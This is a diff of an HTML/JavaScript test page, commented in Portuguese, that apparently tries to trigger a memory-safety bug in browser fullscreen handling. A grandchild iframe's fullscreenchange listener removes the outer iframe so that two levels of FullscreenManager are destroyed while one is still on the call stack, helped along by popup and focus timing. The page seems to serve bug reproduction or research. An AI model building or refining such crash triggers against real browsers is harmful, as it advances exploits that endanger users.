@@ -5,32 +5,32 @@
 <iframe id="testFrame" width="200" height="200"></iframe>
 <script>
 /*
-  V2.4: Iframe dentro de iframe — fullscreen pedido pelo NETO.
-  Dois níveis de FullscreenManager são afetados pelo remove() do pai.
-  O manager do neto está na call stack, o manager do filho é destruído
-  junto com o iframe pai, e o manager do avô (documento principal)
-  fica com referências de dois níveis corrompidas.
+  V2.4: Iframe dentro do iframe. Fullscreen pedido pelo NETO.
+  Callback no NETO faz remove() do AVÔ — destrói dois níveis
+  de FullscreenManager simultaneamente enquanto o do neto
+  ainda está na call stack.
 */
-var outerIframe = document.getElementById("testFrame");
-var popup = null;
+var outerFrame = document.getElementById("testFrame");
+var popup      = null;
+var innerReady = false;
 
-outerIframe.onload = function() {
-    var outerDoc = outerIframe.contentDocument;
+outerFrame.onload = function() {
+    var outerDoc = outerFrame.contentDocument;
     if (!outerDoc || !outerDoc.body) return;
+    if (innerReady) return;
 
     outerDoc.open();
     outerDoc.write(
         '<!DOCTYPE html><html><body>' +
-        '<iframe id="innerFrame" width="150" height="150"></iframe>' +
+        '<iframe id="inner" width="150" height="150"></iframe>' +
         '</body></html>'
     );
     outerDoc.close();
 
-    var innerIframe = outerDoc.getElementById("innerFrame");
-    if (!innerIframe) return;
+    var innerFrame = outerDoc.getElementById("inner");
 
-    innerIframe.onload = function() {
-        var innerDoc = innerIframe.contentDocument;
+    innerFrame.onload = function() {
+        var innerDoc = innerFrame.contentDocument;
         if (!innerDoc || !innerDoc.body) return;
 
         innerDoc.open();
@@ -41,46 +41,47 @@ outerIframe.onload = function() {
         );
         innerDoc.close();
 
-        // Listener no NETO
+        innerReady = true;
+
+        // Listener no NETO — remove o AVÔ
         innerDoc.addEventListener('webkitfullscreenchange', function() {
             document.getElementById("status").innerHTML =
-                "INNER fullscreenchange — removendo outerIframe";
+                "INNER fullscreenchange — remove avô";
 
-            // Remove o PAI — destrói dois níveis de Document de uma vez
-            // FullscreenManager do neto está na call stack
-            // FullscreenManager do filho é destruído junto
-            if (outerIframe && outerIframe.parentNode) {
-                outerIframe.remove();
-            }
+            // Remove dois níveis de Document de uma vez
+            if (outerFrame && outerFrame.parentNode) outerFrame.remove();
             if (popup && !popup.closed) popup.close();
-
-            document.getElementById("status").innerHTML +=
-                " | outerIframe removido";
         });
-
-        // Fullscreen no neto, não no filho direto
-        innerDoc.documentElement.webkitRequestFullscreen();
-
-        setTimeout(function() {
-            if (!popup || popup.closed) return;
-            popup.focus();
-            window.focus();
-            try { outerIframe.contentWindow.focus(); } catch(e) {}
-            try { innerIframe.contentWindow.focus(); } catch(e) {}
-            setTimeout(function() {
-                if (popup && !popup.closed) popup.close();
-            }, 300);
-        }, 300);
     };
 };
 
 document.getElementById("run").onclick = function() {
-    document.getElementById("status").innerHTML = "iniciando...";
+    if (!innerReady) {
+        document.getElementById("status").innerHTML = "aguarde iframe carregar";
+        return;
+    }
+
     popup = window.open("", "_blank", "width=400,height=300");
-    if (!popup) { document.getElementById("status").innerHTML = "bloqueado"; return; }
     popup.document.open();
     popup.document.write('<!DOCTYPE html><html><body><h3>Popup</h3></body></html>');
     popup.document.close();
+
+    // Fullscreen pedido pelo NETO
+    var innerDoc = outerFrame.contentDocument
+                             .getElementById("inner")
+                             .contentDocument;
+    innerDoc.documentElement.webkitRequestFullscreen();
+
+    setTimeout(function() {
+        if (!popup || popup.closed) return;
+        popup.focus();
+        window.focus();
+        try { outerFrame.contentWindow.focus(); } catch(e) {}
+
+        setTimeout(function() {
+            if (popup && !popup.closed) popup.close();
+        }, 300);
+    }, 300);
 };
 </script>
 </body>
